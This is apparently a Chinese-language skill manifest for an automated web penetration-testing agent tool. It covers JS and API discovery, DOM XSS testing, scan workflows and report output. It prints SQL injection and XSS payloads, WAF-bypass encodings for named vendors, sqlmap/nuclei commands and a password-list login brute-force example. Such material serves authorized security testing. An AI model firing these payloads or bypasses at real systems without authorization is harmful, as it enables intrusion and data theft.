# Payloader Skill - 渗透测试辅助平台 v3.0

## 概述

本 skill 提供**自动化接口渗透测试**能力，包含信息采集器、payload 知识库、自动化测试引擎和智能决策系统。

## v3.0 新增功能

### 信息采集器 (Collectors)
- **JS 采集器** - JavaScript 指纹缓存 + Webpack 分析
- **API 路径发现器** - 25+ 正则规则发现 API 路径
- **URL/域名采集器** - 域名、Base URL、静态资源发现
- **浏览器动态采集器** - 无头浏览器动态渲染内容采集

### 浏览器动态测试引擎
- **DOM XSS 检测** - 使用浏览器自动化检测客户端 XSS
- **SPA 路由测试** - 测试 Vue/React/Angular 等 SPA 应用的路由安全
- **表单交互测试** - 模拟用户填写表单提交检测存储型 XSS

## 快速开始

### 信息采集
```bash
# JS 采集 + API 发现
skill security-testing collect --target https://target.com --type js

# 浏览器动态采集
skill security-testing collect --target https://target.com --type browser

# 完整采集 (JS + URL + Browser)
skill security-testing discover --target https://target.com
```

### 安全测试
```bash
# 自动化扫描
skill security-testing scan --target https://target.com --type full

# DOM XSS 测试
skill security-testing domxss --target https://target.com --browser
```

## 核心能力

| 能力 | 说明 | 状态 |
|------|------|------|
| JS 采集器 | JavaScript 指纹 + Webpack 分析 | ✅ (v3.0) |
| API 路径发现 | 25+ 正则规则 + AST 解析 | ✅ (v3.0) |
| URL/域名采集 | 域名、Base URL、静态资源 | ✅ (v3.0) |
| 浏览器动态采集 | 无头浏览器 + 控制台捕获 | ✅ (v3.0) |
| DOM XSS 检测 | 客户端 XSS 漏洞发现 | ✅ (v3.0) |
| SPA 路由测试 | Vue/React/Angular 安全 | ✅ (v3.0) |
| 自动化测试 | 一键执行完整渗透测试流程 | ✅ |
| 智能决策 | 根据响应自动调整测试策略 | ✅ |
| WAF 绕过 | 自动检测并绕过 WAF 防护 | ✅ |
| 报告生成 | 自动生成详细测试报告 | ✅ |

## 目录结构

```
security-testing/
├── SKILL.md                          # 本文件 - 入口与索引
├── core/                             # 核心引擎
│   ├── api_tester.py                # API 测试引擎
│   ├── browser_tester.py            # 浏览器动态测试引擎
│   ├── payload_loader.py            # Payload 加载器
│   ├── response_analyzer.py         # 响应分析器
│   ├── report_generator.py          # 报告生成器
│   └── collectors/                   # 信息采集器 (v3.0 新增)
│       ├── __init__.py
│       ├── js_collector.py          # JS 采集器
│       ├── api_path_finder.py        # API 路径发现器
│       ├── url_collector.py          # URL/域名采集器
│       └── browser_collector.py      # 浏览器动态采集器
├── payloads/                         # 结构化 payload 库
│   ├── sqli.json                    # SQL 注入 payload
│   ├── xss.json                     # XSS payload
│   ├── dom_xss.json                 # DOM XSS payload (NEW!)
│   ├── rce.json                     # RCE payload
│   └── auth.json                    # 认证测试 payload
├── workflows/                        # 测试流程定义
│   ├── api_discovery.yaml
│   ├── auth_test.yaml
│   └── vulnerability_scan.yaml
└── reports/                          # 测试报告输出
```

## 自动化测试流程

### 阶段 1: 信息收集
```yaml
name: 信息收集
tasks:
  - scan_endpoints: 扫描 API 端点
  - identify_methods: 识别 HTTP 方法
  - detect_auth: 检测认证机制
  - fingerprint_tech: 识别技术栈
```

### 阶段 2: 认证测试
```yaml
name: 认证测试
tasks:
  - test_default_credentials: 测试默认密码
  - test_auth_bypass: 测试认证绕过
  - test_jwt_weakness: 测试 JWT 弱点
  - test_session_management: 测试会话管理
```

### 阶段 3: 漏洞测试
```yaml
name: 漏洞测试
tasks:
  - test_sqli: SQL 注入测试
  - test_xss: XSS 测试
  - test_command_injection: 命令注入
  - test_path_traversal: 路径遍历
  - test_idor: IDOR 测试
  - test_rate_limiting: 速率限制测试
```

### 阶段 4: 报告生成
```yaml
name: 报告生成
tasks:
  - generate_summary: 生成执行摘要
  - export_results: 导出结果
  - create_remediation: 生成修复建议
```

## 信息采集器 (Collectors)

### JS 采集器 (js_collector.py)
```python
from collectors import JSCollector

collector = JSCollector(max_depth=3)
cache = collector.collect("https://target.com")

# 获取解析结果
for js_url, result in cache._cache.items():
    print(f"端点: {result.endpoints}")
    print(f"参数: {result.parameter_names}")
    print(f"路由: {result.routes}")
    print(f"父路径: {result.parent_paths}")
```

### API 路径发现器 (api_path_finder.py)
```python
from collectors import ApiPathFinder

finder = ApiPathFinder()
apis = finder.find_api_paths_in_text(js_content, source="js")

print(f"发现 {len(apis)} 个 API")
print(f"父路径: {finder.get_parent_paths()}")
print(f"资源名: {finder.get_resource_names()}")

# 生成 Fuzz 目标
fuzz_targets = finder.generate_fuzz_targets(
    parent_paths=finder.get_parent_paths(),
    resources=finder.get_resource_names()
)
```

### URL 采集器 (url_collector.py)
```python
from collectors import URLCollector

collector = URLCollector()
result = collector.collect_from_html(html, base_url)

print(f"域名: {result.domains}")
print(f"子域名: {result.subdomains}")
print(f"Base URLs: {result.base_urls}")
print(f"API URLs: {result.api_urls}")
print(f"静态资源: {result.static_urls}")
```

### 浏览器动态采集器 (browser_collector.py)
```python
from collectors import BrowserCollectorFacade

facade = BrowserCollectorFacade(headless=True)
result = facade.collect_all("https://target.com", {
    'interactions': [
        {'type': 'click', 'selector': '.btn'},
        {'type': 'fill', 'data': {'username': 'admin'}},
    ],
    'capture_console': True,
    'capture_storage': True,
})

print(f"JS URLs: {len(result['js_urls'])}")
print(f"API 请求: {len(result['api_requests'])}")
print(f"WebSocket: {len(result['websocket_connections'])}")
print(f"控制台: {len(result['console_logs'])}")
```

## Payload 库

### SQL 注入 Payload
```json
{
  "category": "SQL Injection",
  "payloads": [
    {
      "name": "OR 1=1",
      "payload": "' OR '1'='1",
      "type": "boolean_based",
      "detection_pattern": ["welcome", "admin", "success"],
      "waf_bypass": ["' OR 1=1--", "' OR 1=1#"]
    },
    {
      "name": "UNION SELECT",
      "payload": "' UNION SELECT NULL,NULL,NULL--",
      "type": "union_based",
      "columns_test": [1, 2, 3, 4, 5, 10, 20]
    }
  ]
}
```

### XSS Payload
```json
{
  "category": "XSS",
  "payloads": [
    {
      "name": "Basic Script",
      "payload": "<script>alert(1)</script>",
      "type": "reflected"
    },
    {
      "name": "Image OnError",
      "payload": "<img src=x onerror=alert(1)>",
      "type": "reflected",
      "waf_bypass": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
    }
  ]
}
```

## 智能决策系统

### WAF 检测与绕过
```python
def detect_waf(response):
    waf_signatures = {
        '360': '360waf',
        'aliyun': 'aliyuncs.com',
        'tencent': 'tencent-cloud.net'
    }
    for waf, signature in waf_signatures.items():
        if signature in response.text:
            return waf
    return None

def get_bypass_methods(waf_name):
    bypass_db = {
        '360': ['%20', '%09', '%0a', '/**/'],
        'aliyun': ['%2520', '%2509', 'unicode']
    }
    return bypass_db.get(waf_name, [])
```

### 响应分析
```python
def analyze_response(response, baseline):
    diff = {
        'status_code_changed': response.status_code != baseline['status_code'],
        'content_length_diff': abs(len(response.content) - baseline['content_length']),
        'content_changed': response.text != baseline['text']
    }
    
    if diff['content_length_diff'] > 100 or diff['status_code_changed']:
        return 'potential_vulnerability'
    return 'normal'
```

## 使用示例

### 示例 1: 单接口测试
```bash
skill security-testing sqli \
  --target https://target.com/api/user \
  --param id \
  --method GET
```

### 示例 2: 完整扫描
```bash
skill security-testing scan \
  --target https://target.com \
  --type full \
  --output ./reports/ \
  --threads 5
```

### 示例 3: 认证测试
```bash
skill security-testing auth \
  --target https://target.com/login \
  --username admin \
  --password-list ./passwords.txt
```

## 工具集成

### SQLMap 集成
```yaml
integration:
  name: sqlmap
  command: "sqlmap -u {url} --data={data} --batch --output-dir={output}"
  parser: sqlmap_output_parser
```

### Nuclei 集成
```yaml
integration:
  name: nuclei
  command: "nuclei -u {url} -t {templates} -o {output}"
  parser: nuclei_output_parser
```

## 报告格式

### Markdown 报告
```markdown
# 渗透测试报告

## 执行摘要
- 测试目标：https://target.com
- 测试时间：2026-03-30
- 测试接口数：50

## 漏洞统计
- 🔴 严重：2
- 🟠 高危：5
- 🟡 中危：10
- 🟢 低危：20

## 详细结果
...
```

### JSON 报告
```json
{
  "target": "https://target.com",
  "timestamp": "2026-03-30T12:00:00Z",
  "vulnerabilities": [
    {
      "type": "sqli",
      "severity": "critical",
      "endpoint": "/api/user",
      "payload": "' OR '1'='1",
      "evidence": "..."
    }
  ]
}
```

## 快速索引

### 按漏洞类型

| 漏洞类型 | Payload 文件 | 测试流程 | WAF 绕过 |
|----------|-------------|---------|---------|
| SQL 注入 | `payloads/sqli.json` | `workflows/sqli_test.yaml` | ✅ |
| XSS | `payloads/xss.json` | `workflows/xss_test.yaml` | ✅ |
| RCE | `payloads/rce.json` | `workflows/rce_test.yaml` | ✅ |
| 认证绕过 | `payloads/auth.json` | `workflows/auth_test.yaml` | ✅ |
| IDOR | `payloads/business_logic.json` | `workflows/idor_test.yaml` | ✅ |

### 按测试阶段

| 阶段 | 流程文件 | 说明 |
|------|---------|------|
| 信息收集 | `workflows/api_discovery.yaml` | 发现 API 端点 |
| 认证测试 | `workflows/auth_test.yaml` | 测试认证机制 |
| 漏洞扫描 | `workflows/vulnerability_scan.yaml` | 全面漏洞扫描 |
| 报告生成 | `workflows/report_gen.yaml` | 生成测试报告 |

## 配置示例

### 配置文件
```yaml
# config.yaml
target: https://target.com
threads: 5
timeout: 30
user_agent: "Mozilla/5.0 (compatible; SecurityTesting/2.0)"
rate_limit: 10  # 每秒请求数
waf_bypass: true
save_state: true
output:
  format: [markdown, json]
  directory: ./reports/
```

## 更新日志

### v2.0 (2026-03-30)
- ✅ 添加自动化测试引擎
- ✅ 添加智能决策系统
- ✅ 添加结构化 payload 库
- ✅ 添加 WAF 检测与绕过
- ✅ 添加报告生成器
- ✅ 添加并行测试支持
- ✅ 集成 SQLMap/Nuclei

### v1.0 (原始版本)
- 基础 payload 知识库
- 攻击链模板
- 内网渗透指南

---

*Skill 版本：v2.0*
*更新时间：2026-03-30*
*维护者：Security Team*
*GitHub: https://github.com/steveopen1/skill-play*
